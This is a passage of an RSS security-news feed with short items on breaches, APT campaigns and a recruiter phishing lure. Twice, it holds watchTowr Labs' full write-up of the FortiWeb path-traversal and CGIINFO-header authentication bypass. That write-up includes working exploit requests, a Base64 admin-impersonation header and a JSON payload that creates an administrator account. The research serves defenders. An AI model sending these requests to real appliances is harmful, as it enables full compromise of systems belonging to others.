Erick]]></content:encoded></item><item><title>Honeypot: FortiWeb CVE-2025-64446 Exploits, (Sat, Nov 15th)</title><link>https://isc.sans.edu/diary/rss/32486</link><author></author><category>threatintel</category><pubDate>Sat, 15 Nov 2025 09:44:35 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Like many have reported, we too noticed exploit attempts for CVE-2025-64446 in our honeypots.]]></content:encoded></item><item><title>CodeStepByStep - codestepbystep.com</title><link>https://haveibeenpwned.com/PwnedWebsites#CodeStepByStep</link><author></author><category>databreach</category><pubDate>Sat, 15 Nov 2025 00:00:00 +0000</pubDate><source url="https://cybermonit.com/leaks">Recent Data breaches</source><content:encoded><![CDATA[W listopadzie 2025 r. w internetowym narzędziu do ćwiczeń kodowania CodeStepByStep doszło do naruszenia bezpieczeństwa danych, w wyniku którego ujawniono 17 tys. rekordów.Dane, których to dotyczy, obejmowały imiona i nazwiska, nazwy użytkowników i adresy e-mail.]]></content:encoded></item><item><title>Friday Squid Blogging: Pilot Whales Eat a Lot of Squid</title><link>https://www.schneier.com/blog/archives/2025/11/friday-squid-blogging-pilot-whales-eat-a-lot-of-squid.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 14 Nov 2025 23:33:12 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Short-finned pilot wales (Globicephala macrorhynchus) eat at lot of squid:To figure out a short-finned pilot whale’s caloric intake, Gough says, the team had to combine data from a variety of sources, including movement data from short-lasting tags, daily feeding rates from satellite tags, body measurements collected via aerial drones, and sifting through the stomachs of unfortunate whales that ended up stranded on land.Once the team pulled all this data together, they estimated that a typical whale will eat between 82 and 202 squid a day. To meet their energy needs, a whale will have to consume an average of 140 squid a day. Annually, that’s about 74,000 squid per whale. For all the whales in the area, that amounts to about 88,000 tons of squid eaten every year.As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT</title><link>https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/</link><author>Keerthiraj Nagaraj, Vishwa Thothathri, Nabeel Mohamed and Reethika Ramesh</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/11/04_Security-Technology_Category_1505x922.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 23:00:04 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Two campaigns delivering Gh0st RAT to Chinese speakers show a deep understanding of the target population's virtual environment and online behavior.]]></content:encoded></item><item><title>Suspected Russian hacker reportedly detained in Thailand, faces possible US extradition</title><link>https://databreaches.net/2025/11/14/suspected-russian-hacker-reportedly-detained-in-thailand-faces-possible-us-extradition/?pk_campaign=feed&amp;pk_kwd=suspected-russian-hacker-reportedly-detained-in-thailand-faces-possible-us-extradition</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 14 Nov 2025 19:23:09 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Did you hear the one about the ransom victim who made a ransom installment payment after they were told that it wouldn’t be accepted?</title><link>https://databreaches.net/2025/11/14/did-you-hear-the-one-about-the-ransom-victim-who-made-a-ransom-installment-payment-after-they-were-told-that-it-wouldnt-be-accepted/?pk_campaign=feed&amp;pk_kwd=did-you-hear-the-one-about-the-ransom-victim-who-made-a-ransom-installment-payment-after-they-were-told-that-it-wouldnt-be-accepted</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 14 Nov 2025 19:07:20 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>North Korean Hackers Turn JSON Services into Covert Malware Delivery Channels</title><link>https://thehackernews.com/2025/11/north-korean-hackers-turn-json-services.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhezv9r6ClrAlk-BAArf2qit1LLkCBtsnc22v9EJEuoGm8ZQfYXSoQJdoTrKRMDlQMCkhtTbaHx3mCh86eh1NHLPkFQQGDQ33zkO0W44RQac1TFZhD2-kKTk4WZIEWJzYrsGHjGEzSOEvFiZGpQa35Fli1w5rqbjrOdq3QtvpUPRl28X3vv1urOJpV4s-th/s1600/json.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 18:25:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The North Korean threat actors behind the Contagious Interview campaign have once again tweaked their tactics by using JSON storage services to stage malicious payloads.
"The threat actors have recently resorted to utilizing JSON storage services like JSON Keeper, JSONsilo, and npoint.io to host and deliver malware from trojanized code projects, with the lure," NVISO researchers Bart Parys, Stef]]></content:encoded></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/11/upcoming-speaking-engagements-50.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 14 Nov 2025 17:08:57 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[This is a current list of where and when I am scheduled to speak:I’m speaking on “Integrity and Trustworthy AI” at North Hennepin Community College in Brooklyn Park, Minnesota, USA, on Friday, November 21, 2025, at 2:00 PM CT. The event is cohosted by the college and The Twin Cities IEEE Computer Society.Nathan E. Sanders and I will be speaking at the MIT Museum in Cambridge, Massachusetts, USA, on December 1, 2025, at 6:00 pm ET.Nathan E. Sanders and I will be speaking at a virtual event hosted by City Lights on the Zoom platform, on December 3, 2025, at 6:00 PM PT.I’m speaking and signing books at the Chicago Public Library in Chicago, Illinois, USA, on February 5, 2026. Details to come.]]></content:encoded></item><item><title>Be careful responding to unexpected job interviews</title><link>https://www.malwarebytes.com/blog/news/2025/11/be-careful-responding-to-unexpected-job-interviews</link><author></author><category>threatintel</category><pubDate>Fri, 14 Nov 2025 16:30:38 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[One of our customers was contacted on LinkedIn about a job offer. The initial message was followed up by an email:“Thank you for your interest in the Senior Construction Manager position at {company}. After reviewing your background, we were impressed with your experience and would like to invite you to the next stage of our selection process — a virtual interview.In this session, we’ll discuss your project management experience, leadership approach, and how your expertise aligns with {company}’s current and upcoming construction initiatives.A Zoom link will be shared in a follow-up email, which will allow you to select a time that’s most convenient for you.If you have any questions in the meantime, please don’t hesitate to reach out. I look forward to speaking with you soon.I edited out the company name and the name of the supposed recruiter, but when we Googled that alleged recruiter’s name, he does work at the impersonated company (just not in HR). That’s not unique, though. We’ve heard several variants of very similar stories involving other companies and other names.Other red flags included the fact that the email came from a Gmail address (not a company domain), and that the company has no openings for a Senior Construction Manager.When our target replied they were looking forward to the interview, they received the “Meeting invitation” by email:      {recruiter} INVITED YOU TO A ZOOM REMOTE MEETINGPlease click the button below to view the invitation within 30 days. By acceptance, you’ll be able to message and call each other.To see the list of invited guests, click here.Both links in this email were shortened t[.]co links that redirected to meetingzs[.]com/bt.That site is currently unavailable, but users have reported seeing fake Windows update warnings, or notifications about having to install updates for their meeting application (Zoom, Teams—name your favorite). Our logs show that we blocked meetingzs[.]com for phishing and hosting a file called GoToResolveUnattendedUpdater.exe.While this file is not malicious in itself, it can be abused by cybercriminals. It’s associated with LogMeIn Resolve, a remote support tool, which attackers can fake or misuse to execute ransomware payloads once installed.This tactic is part of a broader trend where attackers pose as recruiters or trusted contacts, inviting targets to meetings and requiring them to install software updates to participate. Those updates, however, can be malware installers or Remote Monitoring and Management (RMM) tools which can give attackers direct access to your device.This type of attack is a prime example of how social engineering is becoming the primary way to gain initial access to you or your company’s system.The best way to stay safe is to be able to recognize attacks like these, but there are some other things you can do.Always keep your operating system, software, and security tools updated regularly with the latest patches to close vulnerabilities.Be extremely cautious with unsolicited communications, especially those inviting you to meetings or requesting software installs or updates; verify the sender and context independently.Avoid clicking on links or downloading attachments from unknown or unexpected sources. Verify their authenticity first.Compare the URL in the browsers’ address bar to what you’re expecting.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Researchers Find Serious AI Bugs Exposing Meta, Nvidia, and Microsoft Inference Frameworks</title><link>https://thehackernews.com/2025/11/researchers-find-serious-ai-bugs.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvXUzfhBmTMQepFWxeCqGiCA1jeHDUVl22obOgD7DCd_E-UtUwkmZVN7j1TuQAv0P0yRwKviM36m4hNCyORyL2-NegjDYQ3Qc_RYa1DeWD9Txp3RoZfKHn4lj0ozeqYFqYlgNYhhfEHEB-invbzPGNopYWrAmzNflKp1G1qdvMZPVj_pIaocnxn_QecmU9/s1600/1000033960.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 15:20:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have uncovered critical remote code execution vulnerabilities impacting major artificial intelligence (AI) inference engines, including those from Meta, Nvidia, Microsoft, and open-source PyTorch projects such as vLLM and SGLang.
"These vulnerabilities all traced back to the same root cause: the overlooked unsafe use of ZeroMQ (ZMQ) and Python's pickle deserialization,"]]></content:encoded></item><item><title>Iranian Hackers Launch ‘SpearSpecter’ Spy Operation on Defense &amp; Government Targets</title><link>https://thehackernews.com/2025/11/iranian-hackers-launch-spearspecter-spy.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZy2HLaE1qe-Ab4Bld4GiRpAYh0uVDVr3zCE1p400nKomsAs0MdvK9oCnNrJALSYPVvJud59Ik0Ax90X12KX93i97AwzbnUHm262vSL-nelhZHwRQR6WIFNd_u43NOt4QR8yOpzgC9wQUabBhtxfz45S210t-Tw-hb6iJWQ7RQNIfupIRQuvWuDBu1GgWs/s1600/iran-hackers.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 14:40:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The Iranian state-sponsored threat actor known as APT42 has been observed targeting individuals and organizations that are of interest to the Islamic Revolutionary Guard Corps (IRGC) as part of a new espionage-focused campaign.
The activity, detected in early September 2025 and assessed to be ongoing, has been codenamed SpearSpecter by the Israel National Digital Agency (INDA).
"The]]></content:encoded></item><item><title>When The Impersonation Function Gets Used To Impersonate Users (Fortinet FortiWeb (??) Auth. Bypass) - watchTowr Labs</title><link>https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/</link><author>/u/dx7r__</author><category>netsec</category><pubDate>Fri, 14 Nov 2025 14:27:42 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[The Internet is ablaze, and once again we all have a front-row seat - a bad person, if you can believe it, is doing a bad thing!The first warning of such behaviour came from the great team at Defused:As many are now aware, an unnamed (and potentially silently fixed) vulnerability affecting a number of Forti-devices (blast radius is currently unclear) is being actively exploited. For many, this will feel like a normal Tuesday.For others, it will feel like a Monday.Moments like this are why we exist- as always, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:POST /api/v2.0/cmdb/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1
Host: [redacted]
User-Agent: python-urllib3/2.2.3
Accept-Encoding: identity
CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
Content-Length: 835
Content-Type: application/json

{ "data": { "q_type": 1, "name": "Testpoint", "access-profile": "prof_admin", "access-profile_val": "0", "trusthostv4": "0.0.0.0/0 ", "trusthostv6": "::/0 ", "last-name": "", "first-name": "", "email-address": "", "phone-number": "", "mobile-number": "", "hidden": 0, "domains": "root", "sz_dashboard": -1, "type": "local-user", "type_val": "0", "admin-usergrp_val": "0", "wildcard_val": "0", "accprofile-override_val": "0", "sshkey": "", "passwd-set-time": 0, "history-password-pos": 0, "history-password0": "", "history-password1": "", "history-password2": "", "history-password3": "", "history-password4": "", "history-password5": "", "history-password6": "", "history-password7": "", "history-password8": "", "history-password9": "", "force-password-change": "disable", "force-password-change_val": "0", "password": "AFodIUU3Sszp5" }}
While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism. To be explicitly clear, this is a complete compromise of the vulnerable appliance.The vulnerability itself? As far as we can see, it’s actually two..A Path Traversal vulnerability that we can see within the URIAn Authentication Bypass vulnerability (via the contents of the HTTP request header  )This question has been screamed at us for the last 24 hours.While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.The following versions are known to be affected (thanks to Orange Cyberdefense for sharing information with us):The First Step - The Path TraversalThe first stage of our vulnerability begins with leveraging a path traversal.GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: 192.168.9.1
Connection: keep-alive

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable.Which CGI executable? Well, there is only one -  - so the choice is fairly simple.The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.If the request returns HTTP 200, the vulnerability is present.If the request returns HTTP 403, the vulnerability has been patched.Let’s very briefly explain how the  binary works. For context, the main function provided by  follows this structure:int __fastcall main(int argc, const char **argv, const char **envp)
{
  [..SNIP..]

  cgi_init(v3);
  while ( !access("/var/log/debug_cgi", 0) )
    sleep(1u);
  if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) )
  {
    cgi_output(v4);
  }
  else
  {
    cgi_process(v4);
    cgi_output(v4);
    conf_end();
  }
  cgi_free(v4);
  return 0;
}
Our goal is to reach the  function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:Both checks must pass (return 0) for execution to proceed to .Step Two (a) - cgi_inputcheck()In reality,  is very simple.The  routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.The relevant portion of the function looks like this:__int64 __fastcall cgi_inputcheck(__int64 a1)
{
  [..SNIP..]
  
  v1 = (char *)cat_cgi_paths();
  snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json");
  free(v1);
  v2 = fopen(s, "r");
  if ( !v2 )
    return 0LL;  // File doesn't exist - check passes
    
  [..SNIP..]
  
  v10 = json_tokener_parse((__int64)v8);
  if ( !v10 )
  {
    // JSON parsing failed - check fails
    return 0LL;
  }
  [..SNIP..]
}
The logic here is remarkably permissive:If the associated  file does  exist (the default case), the function immediately returns  - validation passed.If the file  exist, the only requirement is that the body can be parsed as valid JSON.As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:Step Two (b) - Impersonating Users Via This is where things become significantly more interesting.While you might expect  to authenticate the caller, that is  what it does. Instead, the function effectively provides a mechanism to  based on data supplied by the client. The behaviour unfolds in several steps:At , the function extracts a  header from the HTTP request.At , the value is Base64-decoded.At , the result is parsed as JSON.At , the function iterates through all JSON keys and extracts several user-related attributes: > target username > login identifierThese fields are used to tell  which user the HTTP request sender wishes to impersonate.Notably, the built-in  account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.The relevant portion of the function looks like this:__int64 __fastcall cgi_auth(_QWORD *a1)
{
  [..SNIP..]
  
  v2 = getenv("HTTP_CGIINFO");
  if ( !v2 )
  {
    message("%s:%d: not include cgi info header\\n", s);
    return 0xFFFFFFFFLL;
  }
  
  // Decode base64 HTTP_CGIINFO header
  cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2]
  v3 = json_tokener_parse(v19); // [3]
  
  [..SNIP..]
  
  // Extract user attributes from the decoded JSON
  // [4]
  for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) )
  {
    v5 = *(const char **)i;
    string = (const char *)json_object_get_string(*(_QWORD *)(i + 16));
    
    if ( !strncmp(v5, "username", 8uLL) )
      a1[682] = strdup(string);
    else if ( !strncmp(v5, "profname", 8uLL) )
      a1[683] = strdup(string);
    else if ( !strncmp(v5, "vdom", 4uLL) )
      a1[684] = strdup(string);
    else if ( !strncmp(v5, "loginname", 9uLL) )
      a1[685] = strdup(string);
    // ... additional fields
  }
  
  // Set login context with extracted credentials
  
  // [5]
  set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL);
  domain_id = cmf_shm_find_domain_id((void *)a1[684]);
  cmf_set_cur_domain_id(domain_id);
  
  return 0LL;
}
Once all fields are extracted, the call at  -  - applies the impersonation context.From this point onward, all actions executed within  are performed as the impersonated user.In other words - by supplying a handcrafted  header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.Exploiting The VulnerabilityWith both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:Create a JSON object with built-in  credentials:{
  "username": "admin",
  "profname": "super_admin",
  "vdom": "root",
  "loginname": "admin"
}
Send it in the  headerOnce processed by , the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.From this point on, all execution flows into , which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.For example, the following payload instructs the appliance to create a new local user named  with the password  and administrative privileges ():{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}
Detection Artefact GeneratorAs in-the-wild exploitation indiscriminately targets FortiWeb appliances globally, we're releasing our Detection Artefact Generator to enable defenders to identify vulnerable hosts in their estates.The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: Gain early access to our research, and understand your exposure, with the watchTowr PlatformREQUEST A DEMO]]></content:encoded></item><item><title>When The Impersonation Function Gets Used To Impersonate Users (Fortinet FortiWeb (??) Auth. Bypass)</title><link>https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/</link><author>Sina Kheirkhah (@SinSinology)</author><category>vulns</category><pubDate>Fri, 14 Nov 2025 14:25:43 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# When The Impersonation Function Gets Used To Impersonate Users (Fortinet FortiWeb (??) Auth. Bypass)

The Internet is ablaze, and once again we all have a front-row seat - a bad person, if you can believe it, is doing a bad thing!

The first warning of such behaviour came from the great team at Defused:

As many are now aware, an unnamed (and potentially silently fixed) vulnerability affecting a number of Forti-devices (blast radius is currently unclear) is being actively exploited. For many, this will feel like a normal Tuesday.

For others, it will feel like a Monday.

Moments like this are why we exist. As soon as we identified the activity, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.

### The Vulnerability

Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:

```
POST /api/v2.0/cmd/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1 Host: [redacted] User-Agent: python-urllib3/2.2.3 Accept-Encoding: identity CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ== Content-Length: 835 Content-Type: application/json { "data": { "q_type": 1, "name": "Testpoint", "access-profile": "prof_admin", "access-profile_val": "0", "trusthostv4": "0.0.0.0/0 ", "trusthostv6": "::/0 ", "last-name": "", "first-name": "", "email-address": "", "phone-number": "", "mobile-number": "", "hidden": 0, "domains": "root", "sz_dashboard": -1, "type": "local-user", "type_val": "0", "admin-usergrp_val": "0", "wildcard_val": "0", "accprofile-override_val": "0", "sshkey": "", "passwd-set-time": 0, "history-password-pos": 0, "history-password0": "", "history-password1": "", "history-password2": "", "history-password3": "", "history-password4": "", "history-password5": "", "history-password6": "", "history-password7": "", "history-password8": "", "history-password9": "", "force-password-change": "disable", "force-password-change_val": "0", "password": "AFodIUU3Sszp5" }}
```

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.

In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism.

To be explicitly clear, this is a complete compromise of the vulnerable appliance.

The vulnerability itself? As far as we can see, it’s actually two..

- A Path Traversal vulnerability that we can see within the URI
- An Authentication Bypass vulnerability (via the contents of the HTTP request header `CGIINFO`)

### Is Fortinet Aware?

This question has been screamed at us for the last 24 hours.

While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:

Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.

The following versions are known to be affected (thanks to Orange Cyberdefence for sharing some of these versions with us):

- 8.0: <8.0.2
- 7.6: <7.6.5
- 7.4: <7.4.10
- 7.2: <7.2.12
- 7.0: <7.0.12
- 6.4: <= 6.4.3
- 6.3: <= 6.3.23

### The First Step - The Path Traversal

The first stage of our vulnerability begins with leveraging a path traversal.

```
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1 Host: 192.168.9.1 Connection: keep-alive
```

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable. followed by a path-traversal sequence attempting to reach another CGI executable.

Which CGI executable? Well, there is only one - `fwbcgi` \- so the choice is fairly simple.

The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.

- If the request returns HTTP 200, the vulnerability is present.
- If the request returns HTTP 403, the vulnerability has been patched.

### Step Two - FWBCGI

Let’s very briefly explain how the `fwbcgi` binary works. For context, the main function provided by `fwbcgi` follows this structure:

```
int __fastcall main(int argc, const char **argv, const char **envp) { [..SNIP..] cgi_init(v3); while ( !access("/var/log/debug_cgi", 0) ) sleep(1u); if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) ) { cgi_output(v4); } else { cgi_process(v4); cgi_output(v4); conf_end(); } cgi_free(v4); return 0; }
```

Our goal is to reach the `cgi_process()` function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:

1. `cgi_inputcheck()`
2. `cgi_auth()`

Both checks must pass (return 0) for execution to proceed to `cgi_process()`.

### Step Two (a) - cgi\_inputcheck()

In reality, `cgi_inputcheck()` is very simple.

The `cgi_inputcheck()` routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_inputcheck(__int64 a1) { [..SNIP..] v1 = (char *)cat_cgi_paths(); snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json"); free(v1); v2 = fopen(s, "r"); if ( !v2 ) return 0LL; // File doesn't exist - check passes [..SNIP..] v10 = json_tokener_parse((__int64)v8); if ( !v10 ) { // JSON parsing failed - check fails return 0LL; } [..SNIP..] }
```

The logic here is remarkably permissive:

- If the associated `inputcheck` file does **not** exist (the default case), the function immediately returns `0`\- validation passed.
- If the file **does** exist, the only requirement is that the body can be parsed as valid JSON.

As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:

```
{}
```

Let’s move on…

### Step Two (b) - Impersonating Users Via `cgi_auth()`

This is where things become significantly more interesting.

While you might expect `cgi_auth()` to authenticate the caller, that is _not_ what it does. Instead, the function effectively provides a mechanism to **impersonate any user** based on data supplied by the client. The behaviour unfolds in several steps:

1. At **\[1\]**, the function extracts a `CGIINFO` header from the HTTP request.
2. At **\[2\]**, the value is Base64-decoded.
3. At **\[3\]**, the result is parsed as JSON.
4. At **\[4\]**, the function iterates through all JSON keys and extracts several user-related attributes:
   - `username` \> target username
   - `profname` \> profile name
   - `vdom` \> virtual domain
   - `loginname` \> login identifier

These fields are used to tell `fwbcgi` which user the HTTP request sender wishes to impersonate.

Notably, the built-in `admin` account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_auth(_QWORD *a1) { [..SNIP..] v2 = getenv("HTTP_CGIINFO"); if ( !v2 ) { message("%s:%d: not include cgi info header\\n", s); return 0xFFFFFFFFLL; } // Decode base64 HTTP_CGIINFO header cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2] v3 = json_tokener_parse(v19); // [3] [..SNIP..] // Extract user attributes from the decoded JSON // [4] for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) ) { v5 = *(const char **)i; string = (const char *)json_object_get_string(*(_QWORD *)(i + 16)); if ( !strncmp(v5, "username", 8uLL) ) a1[682] = strdup(string); else if ( !strncmp(v5, "profname", 8uLL) ) a1[683] = strdup(string); else if ( !strncmp(v5, "vdom", 4uLL) ) a1[684] = strdup(string); else if ( !strncmp(v5, "loginname", 9uLL) ) a1[685] = strdup(string); // ... additional fields } // Set login context with extracted credentials // [5] set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL); domain_id = cmf_shm_find_domain_id((void *)a1[684]); cmf_set_cur_domain_id(domain_id); return 0LL; }
```

Once all fields are extracted, the call at **\[5\]** \- `set_login_context_vsa()` \- applies the impersonation context.

From this point onward, all actions executed within `cgi_process()` are performed as the impersonated user.

In other words - by supplying a handcrafted `HTTP_CGIINFO` header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.

Beautiful.

### Exploiting the Vulnerability

With both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:

1. Create a JSON object with built-in `admin` credentials:

```
{ "username": "admin", "profname": "super_admin", "vdom": "root", "loginname": "admin" }
```

1. Base64-encode this JSON
2. Send it in the `HTTP_CGIINFO` header

Once processed by `cgi_auth()`, the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.

From this point on, all execution flows into `cgi_process()`, which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.

For example, the following payload instructs the appliance to create a new local user named `watchTowr` with the password `watchTowr` and administrative privileges ( `prof_admin`):

```
{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}
```

# **Detection Artefact Generator**

As in-the-wild exploitation indiscriminately targets FortiWeb appliances globally, we're releasing our Detection Artefact Generator to enable defenders to identify vulnerable hosts in their estates.

This can be found at https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass

The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.

By combining Proactive Threat Intelligence and External Attack Surface Management into a single **Preemptive Exposure Management** capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: **time to respond.**]]></content:encoded></item><item><title>Injection for an athlete</title><link>https://swarm.ptsecurity.com/injection-for-an-athlete/</link><author>admin</author><category>vulns</category><pubDate>Fri, 14 Nov 2025 14:08:14 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[After yet another workout where my sports watch completely lost GPS, I’d had enough. I decided to dig into its firmware and pinpoint the problem. I couldn’t find it published anywhere. No download section, no public archive, nothing. So, I changed tactics and went in through the Android app instead, hoping I could pull the firmware out from there. That’s where this story really begins.

I started by looking at the app’s manifest. Maybe there would be something useful hiding in plain sight. There was. I didn’t have to look for long before I found something interesting.

```
